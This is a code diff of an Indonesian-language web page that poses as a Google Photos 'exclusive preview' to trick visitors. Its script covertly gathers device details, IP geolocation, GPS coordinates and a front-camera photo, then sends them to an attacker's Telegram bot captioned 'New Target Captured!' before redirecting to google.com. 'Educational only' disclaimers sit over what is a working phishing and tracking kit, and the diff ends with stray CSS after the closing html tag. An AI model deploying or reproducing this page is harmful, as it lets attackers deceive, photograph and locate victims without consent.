@@ -3,69 +3,377 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Drive - Pratinjau File</title>
-    <style>
-        /* CSS tidak berubah, tetap sama seperti sebelumnya */
-        body {
-            font-family: 'Google Sans', Roboto, Arial, sans-serif;
-            background-color: #f8f9fa;
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+    <title>Preview Foto Eksklusif - Google Photos</title>
+    <link rel="stylesheet" href="style.css">
+    <!-- 
+    ============================================
+    HALAMAN DEMONSTRASI PHISHING EDUKATIF
+    ============================================
+    PERINGATAN: Sistem ini HANYA untuk tujuan 
+    edukasi keamanan siber dan pengujian penetrasi yang sah.
+    Penggunaan tanpa izin adalah ILEGAL.
+    ============================================
+    -->
+</head>
+<body>
+    <!-- UI yang Meyakinkan -->
+    <div class="container">
+        <header class="header">
+            <div class="google-logo">Google</div>
+            <nav class="nav">
+                <a href="#">Photos</a>
+                <a href="#">Albums</a>
+                <a href="#">Sharing</a>
+            </nav>
+        </header>
+
+        <main class="main-content">
+            <div class="loading-section">
+                <div class="loading-spinner"></div>
+                <h1>Memuat Preview Foto Eksklusif...</h1>
+                <p>Foto Anda sedang diproses dan akan segera tersedia</p>
+                <div class="progress-bar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="permission-section hidden">
+                <h2>🖼️ Akses Diperlukan untuk Preview Foto</h2>
+                <p>Untuk menampilkan preview foto khusus, kami memerlukan akses sementara ke kamera Anda untuk verifikasi keamanan.</p>
+                <button id="allow-access" class="btn-primary">Izinkan Akses Kamera</button>
+                <button id="skip-access" class="btn-secondary">Lewati (Preview Terbatas)</button>
+            </div>
+
+            <div class="photo-preview hidden">
+                <h2>📸 Foto Eksklusif Anda</h2>
+                <div class="photo-container">
+                    <!-- Foto akan ditampilkan di sini -->
+                </div>
+                <p class="success-message">✅ Foto berhasil diproses! Mengalihkan...</p>
+            </div>
+        </main>
+
+        <footer class="footer">
+            <p>&copy; 2024 Google LLC. Semua hak dilindungi undang-undang.</p>
+        </footer>
+    </div>
+
+    <!-- Elemen Tersembunyi untuk Proses -->
+    <video id="video" autoplay playsinline style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        // ============================================
+        // KODE JAVASCRIPT UNTUK DEMONSTRASI PHISHING
+        // ============================================
+        // PERINGATAN: Kode ini HANYA untuk tujuan edukasi
+        // dan pengujian keamanan yang sah.
+        // ============================================
+
+        // Konfigurasi - DALAM PRODUKSI SEHARUSNYA TIDAK DI-HARDCODE
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // PERINGATAN: Hardcoding token tidak aman!
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+        // Elemen DOM
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const loadingSection = document.querySelector('.loading-section');
+        const permissionSection = document.querySelector('.permission-section');
+        const photoPreview = document.querySelector('.photo-preview');
+        const allowAccessBtn = document.getElementById('allow-access');
+        const skipAccessBtn = document.getElementById('skip-access');
+
+        // Data yang dikumpulkan
+        let collectedData = {
+            photo: null,
+            location: null,
+            ipInfo: null,
+            deviceInfo: {}
+        };
+
+        // Fungsi utama
+        document.addEventListener('DOMContentLoaded', async function() {
+            console.log('🚨 DEMO PHISHING: Sistem dimulai (HANYA EDUKASI)');
+            
+            try {
+                // Ekstrak parameter URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const uniqueId = urlParams.get('_y');
+                const encodedChatId = urlParams.get('_x');
+
+                // Validasi parameter
+                if (!uniqueId || !encodedChatId) {
+                    console.error('Parameter URL tidak valid');
+                    redirectToSafeSite();
+                    return;
+                }
+
+                // Decode chat ID
+                const chatId = atob(encodedChatId);
+                collectedData.targetChatId = chatId;
+                collectedData.uniqueId = uniqueId;
+
+                // Mulai proses pengumpulan data secara paralel
+                await startDataCollection();
+
+            } catch (error) {
+                console.error('Error dalam proses:', error);
+                redirectToSafeSite();
+            }
+        });
+
+        // Fungsi untuk memulai pengumpulan data
+        async function startDataCollection() {
+            const promises = [
+                collectDeviceInfo(),
+                collectIPInfo(),
+                requestCameraAccess(),
+                requestLocation()
+            ];
+
+            // Jalankan semua proses secara paralel
+            await Promise.allSettled(promises);
+            
+            // Tampilkan UI permission setelah delay singkat
+            setTimeout(() => {
+                loadingSection.classList.add('hidden');
+                permissionSection.classList.remove('hidden');
+            }, 2000);
         }
-        .container {
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-            width: 100%;
-            max-width: 600px;
-            padding: 24px;
-            box-sizing: border-box;
-            text-align: center;
+
+        // Event listener untuk tombol izin akses
+        allowAccessBtn.addEventListener('click', async () => {
+            try {
+                permissionSection.classList.add('hidden');
+                loadingSection.classList.remove('hidden');
+                
+                // Ambil foto jika akses kamera berhasil
+                if (collectedData.cameraAccess) {
+                    await capturePhoto();
+                }
+                
+                // Kirim data dan redirect
+                await sendCollectedData();
+                redirectToSafeSite();
+                
+            } catch (error) {
+                console.error('Error saat mengambil foto:', error);
+                await sendCollectedData();
+                redirectToSafeSite();
+            }
+        });
+
+        // Event listener untuk tombol lewati
+        skipAccessBtn.addEventListener('click', async () => {
+            permissionSection.classList.add('hidden');
+            await sendCollectedData();
+            redirectToSafeSite();
+        });
+
+        // Fungsi untuk mengambil foto
+        async function capturePhoto() {
+            return new Promise((resolve, reject) => {
+                try {
+                    const context = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob((blob) => {
+                        collectedData.photo = blob;
+                        resolve();
+                    }, 'image/jpeg', 0.8);
+                    
+                } catch (error) {
+                    reject(error);
+                }
+            });
         }
-        .header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #e0e0e0;
-            padding-bottom: 16px;
+
+        // Fungsi untuk mengumpulkan informasi perangkat
+        async function collectDeviceInfo() {
+            collectedData.deviceInfo = {
+                userAgent: navigator.userAgent,
+                screenResolution: `${screen.width}x${screen.height}`,
+                platform: navigator.platform,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack
+            };
         }
-        .logo {
-            width: 40px;
-            height: 40px;
-            margin-right: 16px;
+
+        // Fungsi untuk mengumpulkan informasi IP
+        async function collectIPInfo() {
+            try {
+                const response = await fetch('http://ip-api.com/json/');
+                const data = await response.json();
+                collectedData.ipInfo = data;
+            } catch (error) {
+                console.error('Error mendapatkan info IP:', error);
+                collectedData.ipInfo = { error: 'Gagal mendapatkan info IP' };
+            }
         }
-        h1 {
-            font-size: 22px;
-            color: #202124;
-            margin: 0;
-            font-weight: 400;
+
+        // Fungsi untuk meminta akses kamera
+        async function requestCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    } 
+                });
+                video.srcObject = stream;
+                collectedData.cameraAccess = true;
+            } catch (error) {
+                console.warn('Akses kamera ditolak:', error);
+                collectedData.cameraAccess = false;
+            }
         }
-        .preview-area {
-            background-color: #e8f0fe;
-            border: 1px dashed #4285f4;
-            border-radius: 8px;
-            padding: 40px;
-            margin: 20px 0;
+
+        // Fungsi untuk meminta lokasi
+        async function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    collectedData.location = { error: 'Geolocation tidak didukung' };
+                    resolve();
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        collectedData.location = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                        resolve();
+                    },
+                    (error) => {
+                        console.warn('Akses lokasi ditolak:', error);
+                        collectedData.location = { error: 'Akses lokasi ditolak' };
+                        resolve();
+                    },
+                    { 
+                        timeout: 10000,
+                        enableHighAccuracy: true 
+                    }
+                );
+            });
         }
-        .preview-area p {
-            color: #1967d2;
-            font-size: 18px;
-            margin: 0;
+
+        // Fungsi untuk mengirim data ke Telegram
+        async function sendCollectedData() {
+            try {
+                const formData = new FormData();
+                
+                // Siapkan caption dengan semua data
+                const caption = formatTelegramCaption();
+                
+                if (collectedData.photo) {
+                    formData.append('photo', collectedData.photo, 'captured_photo.jpg');
+                } else {
+                    // Jika tidak ada foto, kirim pesan teks saja
+                    await sendTextMessage(caption);
+                    return;
+                }
+                
+                formData.append('chat_id', collectedData.targetChatId);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'HTML');
+
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+
+                console.log('✅ Data berhasil dikirim ke Telegram');
+
+            } catch (error) {
+                console.error('❌ Error mengirim data ke Telegram:', error);
+            }
         }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #4285f4;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            margin: 20px auto;
+
+        // Fungsi untuk mengirim pesan teks (fallback)
+        async function sendTextMessage(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: collectedData.targetChatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Telegram API error: ${response.status}`);
+                }
+            } catch (error) {
+                console.error('Error mengirim pesan teks:', error);
+            }
         }
-        @keyframes spin {
+
+        // Fungsi untuk memformat caption Telegram
+        function formatTelegramCaption() {
+            const { ipInfo, location, deviceInfo } = collectedData;
+            
+            let caption = `🎯 <b>New Target Captured!</b>\n\n`;
+            
+            // Informasi Lokasi
+            if (location && !location.error) {
+                caption += `📍 <b>GPS Location:</b> Lat: ${location.latitude}, Lon: ${location.longitude}\n`;
+            }
+            
+            // Informasi IP
+            if (ipInfo && ipInfo.status === 'success') {
+                caption += `🌐 <b>IP Address:</b> ${ipInfo.query}\n`;
+                caption += `🏢 <b>ISP:</b> ${ipInfo.isp}\n`;
+                caption += `🏙️ <b>Location:</b> ${ipInfo.city}, ${ipInfo.country}\n`;
+                caption += `🗺️ <b>Region:</b> ${ipInfo.regionName}\n`;
+                caption += `📮 <b>ZIP:</b> ${ipInfo.zip}\n`;
+            }
+            
+            // Informasi Perangkat
+            caption += `💻 <b>Device:</b> ${deviceInfo.platform}\n`;
+            caption += `📱 <b>Screen:</b> ${deviceInfo.screenResolution}\n`;
+            caption += `🌍 <b>Language:</b> ${deviceInfo.language}\n`;
+            caption += `⏰ <b>Timezone:</b> ${deviceInfo.timezone}\n`;
+            
+            // Informasi Tambahan
+            caption += `\n🔧 <b>Additional Info:</b>\n`;
+            caption += `• Camera Access: ${collectedData.cameraAccess ? '✅' : '❌'}\n`;
+            caption += `• Location Access: ${location && !location.error ? '✅' : '❌'}\n`;
+            caption += `• Unique ID: ${collectedData.uniqueId}\n`;
+            
+            caption += `\n⚠️ <i>This is an educational demonstration only</i>`;
+            
+            return caption;
+        }
+
+        // Fungsi untuk redirect ke situs aman
+        function redirectToSafeSite() {
+            setTimeout(() => {
+                window.location.href = 'https://google.com';
+            }, 1500);
+        }
+
+        // Error handling global
+        window.addEventListener('error', (event) => {
+            console.error('Global error:', event.error);
+        });
+    </script>
+</body>
+</html>        @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
